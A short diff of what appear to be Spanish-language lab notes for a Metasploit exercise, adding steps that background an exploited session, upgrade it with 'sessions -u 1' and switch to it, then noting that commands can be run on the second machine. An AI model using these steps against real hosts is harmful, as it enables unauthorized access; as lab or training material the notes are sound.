@@ -10,10 +10,14 @@
 ++ PC1: show options
 ++ PC1: set RHOSTS <ip_PC2>
 ++ PC1: exploit
+++ PC1: Crtl + Z
+++ PC1: y
+++ PC1: sessions -u 1
+++ PC1: sessions 2
 ++ PC1: En este punto ya tenemos acceso a PC2 y podemos ejecutar comandos tales como:
---- ls (listar directorios)
---- mkdir (crear_directorios)
---- rmdir (borrar_directorios)
+--- mkdir, rmdir, ls, cd, etc
+
+
 
 
 
